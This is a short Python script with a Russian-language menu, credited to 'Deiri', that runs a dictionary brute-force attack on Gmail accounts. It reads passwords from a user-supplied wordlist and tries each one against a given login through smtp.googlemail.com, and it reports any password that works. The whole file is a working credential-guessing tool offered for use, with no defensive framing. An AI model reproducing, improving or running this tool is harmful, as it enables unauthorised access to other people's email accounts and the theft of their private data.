
import random
import bs4
import smtplib
import os
import time
import urllib.request
import socket
import urllib.error
import requests
from requests.auth import HTTPProxyAuth
from bs4 import BeautifulSoup
import colorama
from colorama import init, Fore, Back
from os import system
init()
print(Fore.BLUE + "")
os.system('clear')
print('╔═══╗╔╗─╔╗╔═══╗╔═══╗╔╗╔═╗╔═══╗╔═══╗')
print('║╔═╗║║║─║║║╔══╝║╔═╗║║║║╔╝║╔══╝║╔═╗║')
print('║║─╚╝║╚═╝║║╚══╗║║─╚╝║╚╝╝─║╚══╗║╚═╝║')
print('║║─╔╗║╔═╗║║╔══╝║║─╔╗║╔╗║─║╔══╝║╔╗╔╝')
print('║╚═╝║║║─║║║╚══╗║╚═╝║║║║╚╗║╚══╗║║║╚╗')
print('╚═══╝╚╝─╚╝╚═══╝╚═══╝╚╝╚═╝╚═══╝╚╝╚═╝')
print("")
print("")
print("by Deiri  v.1")
print("")
print("")
print ('Начать поиск пароля?:')
print ("")
print ("[1] Да")
print ("[2] Нет")
print("")
option = input('Введите: ')
os.system("clear")
print('╔═══╗╔╗─╔╗╔═══╗╔═══╗╔╗╔═╗╔═══╗╔═══╗')
print('║╔═╗║║║─║║║╔══╝║╔═╗║║║║╔╝║╔══╝║╔═╗║')
print('║║─╚╝║╚═╝║║╚══╗║║─╚╝║╚╝╝─║╚══╗║╚═╝║')
print('║║─╔╗║╔═╗║║╔══╝║║─╔╗║╔╗║─║╔══╝║╔╗╔╝')
print('║╚═╝║║║─║║║╚══╗║╚═╝║║║║╚╗║╚══╗║║║╚╗')
print('╚═══╝╚╝─╚╝╚═══╝╚═══╝╚╝╚═╝╚═══╝╚╝╚═╝')
print("")
print("by Deiri  v.1")
print("")
print("")
if option == '1':
   passlist = input('Для начала введите путь к словарю: ')
if option == '2':
   exit()
pass_found=open(passlist, 'r')
user_name = input('Логин : ')
print("")
server = smtplib.SMTP('smtp.googlemail.com',587)
server.ehlo()
server.starttls()
for password in pass_found:
   try:
       server.login(user_name, password)
       print(Fore.GREEN + '[+] Пароль найден: ' + password)
       break;
   except smtplib.SMTPAuthenticationError:
      print(Fore.RED + '[-] Пароль не найден')
      print("")
input()